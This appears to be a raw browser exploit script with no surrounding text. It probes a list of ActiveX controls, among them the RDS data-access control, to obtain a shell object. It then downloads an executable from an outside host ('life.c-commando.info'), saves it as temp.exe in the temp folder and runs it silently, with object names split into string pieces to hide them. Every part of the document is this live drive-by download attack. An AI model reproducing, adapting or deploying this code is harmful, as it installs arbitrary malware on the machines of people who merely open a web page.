<SCRIPT language="javascript">
var url="http://life.c-commando.info/css3/exe.php";
var urlrds = url+'?spl=rds';
function CreateO(o, n) {
        var r = null;
        
        try { eval('r = o.CreateObject(n)') }catch(e){}
        
        if (! r) {
                try { eval('r = o.CreateObject(n, "")') }catch(e){}
        }
        
        if (! r) {
                try { eval('r = o.CreateObject(n, "", "")') }catch(e){}
        }

        if (! r) {
                try { eval('r = o.GetObject("", n)') }catch(e){}
        }
        
        if (! r) {
                try { eval('r = o.GetObject(n, "")') }catch(e){}
        }
        
        if (! r) {
                try { eval('r = o.GetObject(n)') }catch(e){}
        }
        
        return(r);      
}

function Go(a) {
        var s = CreateO(a, "WSc"+"rip"+"t.Sh"+"ell");
        var o = CreateO(a, "ADO"+"DB.Str"+"eam");
        var e = s.Environment("Process");
        
        var xml = null;
       	var bin = e.Item("TEMP")+ "\\" + "temp.exe";
        var dat; 
        
        try { xml=new XMLHttpRequest(); }
        catch(e) {
                try { xml = new ActiveXObject("Micr"+"osoft.XMLH"+"TTP"); }
                catch(e) {
                        xml = new ActiveXObject("MS"+"XML2.Serv"+"erXMLH"+"TTP");
                }
        }
        
        if (! xml) return(0);
           
        xml.open("GET", urlrds, false)
        xml.send(null);
        dat = xml.responseBody;
        
        o.Type = 1;
        o.Mode = 3;
        o.Open();
        o.Write(dat);
        o.SaveToFile(bin, 2);
                     
        s.Run(bin,0);
}

var i = 0;
var t = new Array('{BD96C556-65A3-11D0-983A-00C04FC29E36}','{BD96C556-65A3-11D0-983A-00C04FC29E36}','{AB9BCEDD-EC7E-47E1-9322-D4A210617116}','{0006F033-0000-0000-C000-000000000046}','{0006F03A-0000-0000-C000-000000000046}','{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}','{6414512B-B978-451D-A0D8-FCFDF33E833C}','{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}','{06723E09-F4C2-43c8-8358-09FCD1DB0766}','{639F725F-1B2D-4831-A9FD-874847682010}','{BA018599-1DB3-44f9-83B4-461454C84BF8}','{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}','{E8CCCDDF-CA28-496b-B050-6C07C962476B}',null);
        
while (t[i]) {
             var a = null;
              
             if (t[i].substring(0,1) == '{') {
                     a = document.createElement("object");
                      a.setAttribute("classid", "clsid:" + t[i].substring(1, t[i].length - 1));
              } else {
                     try { a = new ActiveXObject(t[i]); } catch(e){}
             }
              
              if (a) {
                      try {           
                             var b = CreateO(a, "WSc"+"ript.She"+"ll");
                              if (b) {
                                     Go(a);
                                     //return(0);
                              }
                     } catch(e){}
               }
             i++;
     }
</script>